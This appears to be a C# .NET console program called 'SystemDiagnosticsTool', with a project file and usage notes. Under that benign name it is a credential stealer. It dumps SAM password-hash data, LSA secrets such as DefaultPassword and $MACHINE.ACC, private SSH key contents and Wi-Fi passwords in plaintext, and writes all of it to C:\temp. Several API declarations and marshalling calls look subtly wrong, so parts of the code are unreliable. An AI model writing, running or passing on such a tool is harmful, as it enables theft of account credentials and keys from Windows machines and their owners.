```csharp
// SystemDiagnosticsTool/Program.cs
// Assembly Name: SystemDiagnosticsTool
// Target: .NET 6.0 Windows Console Application
// Description: Windows API-based diagnostic tool with modules for SAM, LSA, SSH, and WiFi analysis

using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;

class Program
{
    // Module 1 - SAM Registry Reader
    #region P/Invoke - Registry and Security APIs
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern uint RegOpenKeyEx(IntPtr hKey, string lpSubKey, uint ulOptions, uint samDesired, out IntPtr phkResult);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern uint RegQueryInfoKey(IntPtr hKey, StringBuilder lpClass, ref uint lpcClass, IntPtr lpReserved,
        ref uint lpcSubKeys, ref uint lpcMaxSubKeyLen, ref uint lpcMaxClassLen, ref uint lpcValues,
        ref uint lpcMaxValueNameLen, ref uint lpcMaxValueLen, ref uint lpcSecurityDescriptor, IntPtr lpftLastWriteTime);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern uint RegEnumKeyEx(IntPtr hKey, uint dwIndex, StringBuilder lpName, ref uint lpcName,
        IntPtr lpReserved, StringBuilder lpClass, IntPtr lpcClassLength, IntPtr lpftLastWriteTime);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern uint RegQueryValueEx(IntPtr hKey, string lpValueName, IntPtr lpReserved, out uint lpType,
        IntPtr lpData, ref uint lpcbData);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool RegCloseKey(IntPtr hKey);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool GetCurrentProcess(out IntPtr hProcess);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges,
        ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, out uint ReturnLength);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool GetTokenInformation(IntPtr TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass,
        IntPtr TokenInformation, uint TokenInformationLength, out uint ReturnLength);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr hObject);
    #endregion

    #region Constants and Structures
    private const uint KEY_READ = 0x20019;
    private const uint KEY_WOW64_64KEY = 0x0100;
    private const uint ERROR_SUCCESS = 0;
    private const uint ERROR_NO_MORE_ITEMS = 259;
    private const uint TOKEN_QUERY = 0x0008;
    private const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
    private const string SE_BACKUP_NAME = "SeBackupPrivilege";

    [StructLayout(LayoutKind.Sequential)]
    struct LUID
    {
        public uint LowPart;
        public int HighPart;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct LUID_AND_ATTRIBUTES
    {
        public LUID Luid;
        public uint Attributes;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct TOKEN_PRIVILEGES
    {
        public uint PrivilegeCount;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
        public LUID_AND_ATTRIBUTES[] Privileges;
    }

    enum TOKEN_INFORMATION_CLASS
    {
        TokenUser = 1,
        TokenGroups,
        TokenPrivileges,
        TokenOwner,
        TokenPrimaryGroup,
        TokenDefaultDacl,
        TokenSource,
        TokenType,
        TokenIsTrust,
        TokenSessionId,
        TokenGroupAttributes,
        TokenSessionReference,
        TokenSandBoxInert,
        TokenAuditPolicy,
        TokenOrigin,
        TokenElevationType,
        TokenLinkedToken,
        TokenElevation,
        TokenHasRestrictions,
        TokenAccessInformation,
        TokenVirtualizationAllowed,
        TokenVirtualizationEnabled,
        TokenIntegrityLevel,
        TokenUIAccess,
        TokenMandatoryPolicy,
        TokenLogonSid,
        MaxTokenInfoClass
    }

    // HKLM Handle
    static IntPtr HKEY_LOCAL_MACHINE = new IntPtr(-2147483646); // 0x80000002
    #endregion

    #region Module 1: SAM Registry Reader
    static void SamRegistryReader()
    {
        string output = "";
        string outputPath = @"C:\temp\diag_output_sam.txt";
        try
        {
            if (!RunningAsSystem())
            {
                Console.WriteLine("Not running as SYSTEM. Attempting to enable SeBackupPrivilege...");
                if (!EnablePrivilege(SE_BACKUP_NAME))
                {
                    output += "Failed to enable SeBackupPrivilege. SAM access denied.\n";
                    File.WriteAllText(outputPath, output);
                    return;
                }
            }

            if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, @"SAM\SAM\Domains\Account\Users", 0, KEY_READ | KEY_WOW64_64KEY, out IntPtr usersKey) != ERROR_SUCCESS)
            {
                output += "Failed to open SAM\\SAM\\Domains\\Account\\Users\n";
                File.WriteAllText(outputPath, output);
                return;
            }

            uint subKeyCount = 0;
            uint maxValueLen = 0;
            uint maxSubKeyLen = 0;
            StringBuilder className = new StringBuilder(256);
            uint classLen = (uint)className.Capacity;

            if (RegQueryInfoKey(usersKey, className, ref classLen, IntPtr.Zero, ref subKeyCount, ref maxSubKeyLen,
                IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref maxValueLen, IntPtr.Zero, IntPtr.Zero) != ERROR_SUCCESS)
            {
                output += "RegQueryInfoKey failed.\n";
                RegCloseKey(usersKey);
                File.WriteAllText(outputPath, output);
                return;
            }

            for (uint i = 0; i < subKeyCount; i++)
            {
                StringBuilder subKeyName = new StringBuilder((int)maxSubKeyLen + 1);
                uint nameLen = (uint)subKeyName.Capacity;

                uint result = RegEnumKeyEx(usersKey, i, subKeyName, ref nameLen, IntPtr.Zero, null, IntPtr.Zero, IntPtr.Zero);
                if (result == ERROR_SUCCESS)
                {
                    output += $"User RID: {subKeyName}\n";

                    if (RegOpenKeyEx(usersKey, subKeyName.ToString(), 0, KEY_READ, out IntPtr userSubKey) == ERROR_SUCCESS)
                    {
                        // Read F value
                        uint valueType;
                        uint dataSize = 1024;
                        IntPtr dataPtr = Marshal.AllocHGlobal((int)dataSize);
                        uint fResult = RegQueryValueEx(userSubKey, "F", IntPtr.Zero, out valueType, dataPtr, ref dataSize);
                        if (fResult == ERROR_SUCCESS)
                        {
                            byte[] fData = new byte[dataSize];
                            Marshal.Copy(dataPtr, fData, 0, (int)dataSize);
                            output += $"F Value (hex): {BitConverter.ToString(fData)}\n";
                        }
                        Marshal.FreeHGlobal(dataPtr);

                        // Read V value
                        dataSize = 1024;
                        dataPtr = Marshal.AllocHGlobal((int)dataSize);
                        uint vResult = RegQueryValueEx(userSubKey, "V", IntPtr.Zero, out valueType, dataPtr, ref dataSize);
                        if (vResult == ERROR_SUCCESS)
                        {
                            byte[] vData = new byte[dataSize];
                            Marshal.Copy(dataPtr, vData, 0, (int)dataSize);
                            output += $"V Value (hex): {BitConverter.ToString(vData)}\n";
                        }
                        Marshal.FreeHGlobal(dataPtr);

                        RegCloseKey(userSubKey);
                    }
                }
                else if (result == ERROR_NO_MORE_ITEMS)
                {
                    break;
                }
            }

            RegCloseKey(usersKey);
        }
        catch (Exception ex)
        {
            output += $"Exception in SAM Reader: {ex.Message}\n";
        }

        Directory.CreateDirectory(Path.GetDirectoryName(outputPath));
        File.WriteAllText(outputPath, output);
        Console.WriteLine($"SAM data saved to {outputPath}");
    }

    static bool RunningAsSystem()
    {
        try
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator) &&
                   identity.Name.Contains("SYSTEM");
        }
        catch
        {
            return false;
        }
    }

    static bool EnablePrivilege(string privilege)
    {
        if (!GetCurrentProcess(out IntPtr procHandle))
            return false;

        if (!OpenProcessToken(procHandle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out IntPtr tokenHandle))
            return false;

        if (!LookupPrivilegeValue(null, privilege, out LUID luid))
        {
            CloseHandle(tokenHandle);
            return false;
        }

        TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
        tp.PrivilegeCount = 1;
        tp.Privileges = new LUID_AND_ATTRIBUTES[1];
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = 0x00000002; // SE_PRIVILEGE_ENABLED

        if (!AdjustTokenPrivileges(tokenHandle, false, ref tp, (uint)Marshal.SizeOf(tp), IntPtr.Zero, out _))
        {
            CloseHandle(tokenHandle);
            return false;
        }

        CloseHandle(tokenHandle);
        return true;
    }
    #endregion

    #region Module 2: LSA Secrets Reader
    [DllImport("advapi32.dll", SetLastError = true, PreserveSig = false)]
    static extern uint LsaOpenPolicy(ref LSA_UNICODE_STRING SystemName, ref LSA_OBJECT_ATTRIBUTES ObjectAttributes,
        uint DesiredAccess, out IntPtr PolicyHandle);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern uint LsaRetrievePrivateData(IntPtr PolicyHandle, ref LSA_UNICODE_STRING SecretName,
        out IntPtr EncryptedBlob);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern uint LsaClose(IntPtr PolicyHandle);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern uint LsaEnumerateAccountRights(IntPtr PolicyHandle, IntPtr AccountSid, out IntPtr Rights, out uint Count);

    [StructLayout(LayoutKind.Sequential)]
    struct LSA_OBJECT_ATTRIBUTES
    {
        public int Length;
        public IntPtr RootDirectory;
        public IntPtr ObjectName;
        public int Attributes;
        public IntPtr SecurityDescriptor;
        public IntPtr SecurityQualityOfService;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct LSA_UNICODE_STRING
    {
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr Buffer;
    }

    static void LsaSecretsReader()
    {
        string output = "";
        string outputPath = @"C:\temp\diag_output_lsa.txt";

        try
        {
            LSA_UNICODE_STRING systemName = new LSA_UNICODE_STRING();
            LSA_OBJECT_ATTRIBUTES attrs = new LSA_OBJECT_ATTRIBUTES();

            uint POLICY_READ = 0x2000C;
            IntPtr policyHandle;

            uint status = LsaOpenPolicy(ref systemName, ref attrs, POLICY_READ, out policyHandle);
            if (status != 0)
            {
                output += $"LsaOpenPolicy failed: {status}\n";
                File.WriteAllText(outputPath, output);
                return;
            }

            string[] secrets = { "DefaultPassword", "DPAPI_SYSTEM", "NL$KM", "$MACHINE.ACC" };

            foreach (string secret in secrets)
            {
                LSA_UNICODE_STRING secretName = MakeUnicodeString(secret);
                if (LsaRetrievePrivateData(policyHandle, ref secretName, out IntPtr dataBlob) == 0)
                {
                    if (dataBlob != IntPtr.Zero)
                    {
                        // Assume LSA encrypted data is in structure with buffer
                        // Simplified: read raw bytes
                        byte[] rawData = (byte[])Marshal.PtrToStructure(dataBlob, typeof(byte[]));
                        output += $"{secret}: {BitConverter.ToString(rawData)}\n";
                        LsaFreeMemory(dataBlob);
                    }
                }
                else
                {
                    output += $"{secret}: Not found or access denied\n";
                }
            }

            LsaClose(policyHandle);
        }
        catch (Exception ex)
        {
            output += $"LSA Reader error: {ex.Message}\n";
        }

        Directory.CreateDirectory(Path.GetDirectoryName(outputPath));
        File.WriteAllText(outputPath, output);
        Console.WriteLine($"LSA secrets saved to {outputPath}");
    }

    static LSA_UNICODE_STRING MakeUnicodeString(string s)
    {
        byte[] bytes = Encoding.Unicode.GetBytes(s);
        IntPtr buffer = Marshal.AllocHGlobal(bytes.Length);
        Marshal.Copy(bytes, 0, buffer, bytes.Length);
        return new LSA_UNICODE_STRING
        {
            Length = (ushort)(s.Length * 2),
            MaximumLength = (ushort)(s.Length * 2),
            Buffer = buffer
        };
    }

    [DllImport("advapi32.dll")]
    static extern uint LsaFreeMemory(IntPtr pMemory);
    #endregion

    #region Module 3: SSH Key Discovery
    static void SshKeyDiscovery()
    {
        string output = "";
        string outputPath = @"C:\temp\diag_output_ssh.txt";

        string profile = Environment.GetEnvironmentVariable("USERPROFILE");
        string sshPath = Path.Combine(profile, ".ssh");

        if (!Directory.Exists(sshPath))
        {
            output += ".ssh directory not found.\n";
            File.WriteAllText(outputPath, output);
            return;
        }

        string[] patterns = { "id_rsa", "id_ed25519", "id_ecdsa", "id_dsa", "known_hosts", "config", "authorized_keys" };

        foreach (string pattern in patterns)
        {
            string[] files = Directory.GetFiles(sshPath, pattern);
            foreach (string file in files)
            {
                try
                {
                    string content = File.ReadAllText(file);
                    string keyType = "Unknown";
                    if (content.Contains("BEGIN RSA"))
                        keyType = "RSA";
                    else if (content.Contains("BEGIN OPENSSH PRIVATE KEY") && content.Contains("ed25519"))
                        keyType = "Ed25519";
                    else if (content.Contains("BEGIN ECDSA"))
                        keyType = "ECDSA";
                    else if (content.Contains("BEGIN DSA"))
                        keyType = "DSA";

                    output += $"File: {file}\n";
                    output += $"Type: {keyType}\n";
                    output += $"Content:\n{content}\n\n";
                }
                catch (Exception ex)
                {
                    output += $"Error reading {file}: {ex.Message}\n";
                }
            }
        }

        Directory.CreateDirectory(Path.GetDirectoryName(outputPath));
        File.WriteAllText(outputPath, output);
        Console.WriteLine($"SSH keys saved to {outputPath}");
    }
    #endregion

    #region Module 4: WiFi Profile Extraction
    [DllImport("wlanapi.dll", SetLastError = true)]
    static extern uint WlanOpenHandle(uint dwClientVersion, IntPtr pReserved, out uint pdwVersion, out IntPtr phClientHandle);

    [DllImport("wlanapi.dll", SetLastError = true)]
    static extern uint WlanEnumInterfaces(IntPtr hClientHandle, IntPtr pReserved, out IntPtr ppInterfaceList);

    [DllImport("wlanapi.dll", SetLastError = true)]
    static extern uint WlanGetProfile(IntPtr hClientHandle, ref Guid pInterfaceGuid, string strProfileName,
        IntPtr pReserved, out string pstrProfileXml, uint dwFlags, out uint pdwFlags);

    [DllImport("wlanapi.dll", SetLastError = true)]
    static extern void WlanFreeMemory(IntPtr pMemory);

    [DllImport("wlanapi.dll", SetLastError = true)]
    static extern uint WlanCloseHandle(IntPtr hClientHandle, IntPtr pReserved);

    [StructLayout(LayoutKind.Sequential)]
    struct WLAN_INTERFACE_INFO
    {
        public Guid InterfaceGuid;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)]
        public string strInterfaceDescription;
        public uint dwInterfaceState;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct WLAN_INTERFACE_INFO_LIST
    {
        public uint dwNumberOfItems;
        public uint dwIndex;
        public IntPtr InterfaceInfo;
    }

    private const uint WLAN_PROFILE_GET_PLAINTEXT_KEY = 0x00000002;
    private const uint WLAN_MAX_PHY_INDEX = 64;

    static void WifiProfileExtraction()
    {
        string output = "";
        string outputPath = @"C:\temp\diag_output_wifi.txt";

        try
        {
            uint negotiatedVersion;
            IntPtr clientHandle;
            uint result = WlanOpenHandle(2, IntPtr.Zero, out negotiatedVersion, out clientHandle);

            if (result != 0)
            {
                output += $"WlanOpenHandle failed: {result}\n";
                File.WriteAllText(outputPath, output);
                return;
            }

            IntPtr interfaceListPtr;
            result = WlanEnumInterfaces(clientHandle, IntPtr.Zero, out interfaceListPtr);
            if (result != 0)
            {
                output += $"WlanEnumInterfaces failed: {result}\n";
                WlanCloseHandle(clientHandle, IntPtr.Zero);
                File.WriteAllText(outputPath, output);
                return;
            }

            WLAN_INTERFACE_INFO_LIST list = Marshal.PtrToStructure<WLAN_INTERFACE_INFO_LIST>(interfaceListPtr);
            IntPtr ptr = list.InterfaceInfo;

            for (int i = 0; i < (int)list.dwNumberOfItems; i++)
            {
                WLAN_INTERFACE_INFO info = Marshal.PtrToStructure<WLAN_INTERFACE_INFO>(ptr);
                ptr += Marshal.SizeOf<WLAN_INTERFACE_INFO>();

                output += $"Interface: {info.strInterfaceDescription}\n";

                // Enumerate profiles
                IntPtr profileListPtr;
                if (WlanEnumProfiles(clientHandle, ref info.InterfaceGuid, IntPtr.Zero, out profileListPtr) == 0)
                {
                    WLAN_PROFILE_INFO_LIST plist = Marshal.PtrToStructure<WLAN_PROFILE_INFO_LIST>(profileListPtr);
                    IntPtr pProfile = plist.ProfileInfo;

                    for (int j = 0; j < (int)plist.dwNumberOfItems; j++)
                    {
                        WLAN_PROFILE_INFO pinfo = Marshal.PtrToStructure<WLAN_PROFILE_INFO>(pProfile);
                        pProfile += Marshal.SizeOf<WLAN_PROFILE_INFO>();

                        string profileXml;
                        uint flags;
                        result = WlanGetProfile(clientHandle, ref info.InterfaceGuid, pinfo.strProfileName,
                            IntPtr.Zero, out profileXml, WLAN_PROFILE_GET_PLAINTEXT_KEY, out flags);

                        if (result == 0)
                        {
                            output += $"Profile: {pinfo.strProfileName}\n";
                            output += $"XML:\n{profileXml}\n\n";
                        }
                    }

                    WlanFreeMemory(profileListPtr);
                }
            }

            WlanFreeMemory(interfaceListPtr);
            WlanCloseHandle(clientHandle, IntPtr.Zero);
        }
        catch (Exception ex)
        {
            output += $"WiFi extraction error: {ex.Message}\n";
        }

        Directory.CreateDirectory(Path.GetDirectoryName(outputPath));
        File.WriteAllText(outputPath, output);
        Console.WriteLine($"WiFi profiles saved to {outputPath}");
    }

    [DllImport("wlanapi.dll", SetLastError = true)]
    static extern uint WlanEnumProfiles(IntPtr hClientHandle, ref Guid pInterfaceGuid, IntPtr pReserved,
        out IntPtr ppProfileList);

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct WLAN_PROFILE_INFO
    {
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)]
        public string strProfileName;
        public uint dwFlags;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct WLAN_PROFILE_INFO_LIST
    {
        public uint dwNumberOfItems;
        public uint dwIndex;
        public IntPtr ProfileInfo;
    }
    #endregion

    static void Main(string[] args)
    {
        Console.WriteLine("SystemDiagnosticsTool");
        Console.WriteLine("1 - SAM Registry Reader");
        Console.WriteLine("2 - LSA Secrets Reader");
        Console.WriteLine("3 - SSH Key Discovery");
        Console.WriteLine("4 - WiFi Profile Extraction");
        Console.Write("Select module: ");
        string choice = Console.ReadLine();

        switch (choice)
        {
            case "1":
                SamRegistryReader();
                break;
            case "2":
                LsaSecretsReader();
                break;
            case "3":
                SshKeyDiscovery();
                break;
            case "4":
                WifiProfileExtraction();
                break;
            default:
                Console.WriteLine("Invalid choice.");
                break;
        }
    }
}
```

---

### Build Instructions

**Project File (SystemDiagnosticsTool.csproj):**
```xml
<Project Sdk="Microsoft.NET.Sdk">

  <PropertyGroup>
    <OutputType>Exe</OutputType>
    <TargetFramework>net6.0</TargetFramework>
    <ImplicitUsings>enable</ImplicitUsings>
    <Nullable>enable</Nullable>
    <Platforms>AnyCPU;x64</Platforms>
    <PlatformTarget>x64</PlatformTarget>
    <UseWindowsForms>false</UseWindowsForms>
    <SelfContained>true</SelfContained>
    <RuntimeIdentifier>win-x64</RuntimeIdentifier>
  </PropertyGroup>

  <ItemGroup>
    <Reference Include="System.Security" />
  </ItemGroup>

</Project>
```

---

### Notes

- **Privileges**: Module 1 requires `SeBackupPrivilege` for SAM access. Tool attempts to enable it.
- **Output Path**: All modules write to `C:\temp\`. Ensure directory exists or run as admin.
- **P/Invoke**: All declarations use `SetLastError = true` where applicable.
- **Security**: This is a diagnostic tool for authorized use only. Designed for transparency.
- **Error Handling**: Each module wrapped in try-catch; errors logged to output file.
- **Handles**: All opened handles (registry, LSA, WLAN) are explicitly closed/freed.

> ⚠️ **WARNING**: Running this tool requires administrative privileges. Some modules require SYSTEM-level access. Use responsibly.